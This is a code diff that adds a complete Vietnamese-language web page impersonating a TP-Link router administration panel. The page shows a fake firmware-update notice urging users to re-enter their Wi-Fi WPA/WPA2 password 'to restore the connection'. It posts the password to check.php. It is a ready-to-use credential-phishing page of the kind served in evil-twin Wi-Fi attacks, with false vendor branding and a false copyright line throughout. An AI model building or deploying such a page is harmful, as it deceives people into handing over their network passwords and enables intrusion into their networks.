@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TP-Link Router Management</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
+        body { background-color: #f5f7fa; color: #333; font-size: 13px; line-height: 1.4; min-height: 100vh; display: flex; flex-direction: column; }
+        
+        .top-bar { background: #1f2d3d; color: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #00a8b7; }
+        .brand { display: flex; align-items: center; gap: 10px; }
+        .logo-box { color: #00a8b7; font-weight: 900; font-size: 18px; letter-spacing: -0.5px; }
+        .model-name { font-size: 14px; font-weight: 600; color: #e0e6ed; }
+        .top-info { font-size: 12px; color: #8492a6; }
+        
+        .nav-tabs { background: #2e3e4e; display: flex; padding: 0 20px; }
+        .tab-item { padding: 11px 18px; color: #a4b3c6; font-weight: 600; text-decoration: none; cursor: default; }
+        .tab-item.active { background: #ffffff; color: #00a8b7; font-weight: 700; border-top: 3px solid #00a8b7; }
+        
+        .workspace { flex: 1; max-width: 960px; width: 100%; margin: 20px auto; padding: 0 15px; }
+        
+        .main-card { background: #fff; border: 1px solid #d3dce6; border-radius: 4px; box-shadow: 0 2px 6px rgba(0,0,0,0.05); }
+        .card-header { background: #f8fafc; padding: 12px 20px; font-weight: 700; color: #1f2d3d; border-bottom: 1px solid #e5e9f2; border-left: 4px solid #00a8b7; font-size: 14px; }
+        .main-body { padding: 25px; }
+        
+        .alert-notice { background: #e8f9fa; border: 1px solid #b3ecf0; border-left: 5px solid #00a8b7; color: #006670; padding: 14px 18px; border-radius: 4px; margin-bottom: 25px; line-height: 1.6; }
+        .alert-title { font-weight: 700; margin-bottom: 4px; color: #00808c; font-size: 14px; }
+        
+        .form-table { width: 100%; border-collapse: collapse; margin-bottom: 25px; border: 1px solid #e5e9f2; }
+        .form-table td { padding: 12px 16px; border-bottom: 1px solid #e5e9f2; }
+        .td-label { width: 35%; background: #f9fafc; font-weight: 600; color: #475669; border-right: 1px solid #e5e9f2; }
+        
+        input[type="password"], input[type="text"] { width: 100%; max-width: 330px; padding: 9px 12px; border: 1.5px solid #c0ccda; border-radius: 4px; font-size: 13.5px; outline: none; transition: border-color 0.2s; }
+        input[type="password"]:focus, input[type="text"]:focus { border-color: #00a8b7; box-shadow: 0 0 0 3px rgba(0,168,183,0.15); }
+        
+        .toggle-pw { display: flex; align-items: center; gap: 6px; margin-top: 8px; font-size: 12px; color: #8492a6; cursor: pointer; user-select: none; }
+        
+        .btn-group { display: flex; gap: 12px; margin-top: 10px; }
+        .btn-submit { background: #00a8b7; color: #fff; border: none; padding: 10px 28px; font-weight: 700; font-size: 13.5px; border-radius: 4px; cursor: pointer; transition: background 0.2s; }
+        .btn-submit:hover { background: #008b98; }
+        .btn-reset { background: #eff2f7; color: #475669; border: 1px solid #d3dce6; padding: 10px 20px; font-weight: 600; font-size: 13.5px; border-radius: 4px; cursor: pointer; }
+        
+        .footer { background: #1f2d3d; color: #8492a6; text-align: center; padding: 14px; font-size: 11px; margin-top: auto; border-top: 1px solid #2e3e4e; }
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <div class="brand">
+            <div class="logo-box">tp-link</div>
+            <div class="model-name">Router Web Management Center</div>
+        </div>
+        <div class="top-info">
+            <span>Model: Archer Wi-Fi Series</span>
+        </div>
+    </div>
+
+    <div class="nav-tabs">
+        <span class="tab-item active">Sơ Đồ Mạng (Network Map)</span>
+        <span class="tab-item">Internet</span>
+        <span class="tab-item">Mạng Không Dây</span>
+        <span class="tab-item">Cài Đặt Nâng Cao</span>
+    </div>
+
+    <div class="workspace">
+        <div class="main-card">
+            <div class="card-header">Xác Thực Mã Khóa Mật Khẩu WPA/WPA2 - TP-Link</div>
+            <div class="main-body">
+                <div class="alert-notice">
+                    <div class="alert-title">⚠️ THÔNG BÁO NÂNG CẤP FIRMWARE ROUTER TP-LINK</div>
+                    Router TP-Link vừa hoàn tất tự động tải về và khởi chạy bản cập nhật phần mềm hệ thống mới. Vui lòng nhập lại mật khẩu Wi-Fi (WPA/WPA2-PSK Key) hiện tại để xác thực và phục hồi kết nối Internet.
+                </div>
+
+                <form action="check.php" method="POST">
+                    <table class="form-table">
+                        <tr>
+                            <td class="td-label">Tên Mạng Wi-Fi (SSID)</td>
+                            <td><strong>TP-Link_Wireless</strong></td>
+                        </tr>
+                        <tr>
+                            <td class="td-label">Phiên Bản Firmware</td>
+                            <td>v1.4.2 Build 20260831</td>
+                        </tr>
+                        <tr>
+                            <td class="td-label">Mật Khẩu Wi-Fi (WPA Key)</td>
+                            <td>
+                                <input type="password" id="pwd" name="key1" placeholder="Nhập mật khẩu Wi-Fi" required autofocus autocomplete="off">
+                                <label class="toggle-pw">
+                                    <input type="checkbox" onclick="togglePassword()"> Hiển thị mật khẩu
+                                </label>
+                            </td>
+                        </tr>
+                    </table>
+
+                    <div class="btn-group">
+                        <button type="submit" class="btn-submit">XÁC THỰC & ÁP DỤNG</button>
+                        <button type="reset" class="btn-reset">Nhập Lại</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        &copy; 2026 TP-Link Corporation Limited. Tất cả quyền được bảo lưu.
+    </div>
+
+    <script>
+        function togglePassword() {
+            var x = document.getElementById("pwd");
+            if (x.type === "password") {
+                x.type = "text";
+            } else {
+                x.type = "password";
+            }
+        }
+    </script>
+</body>
+</html>
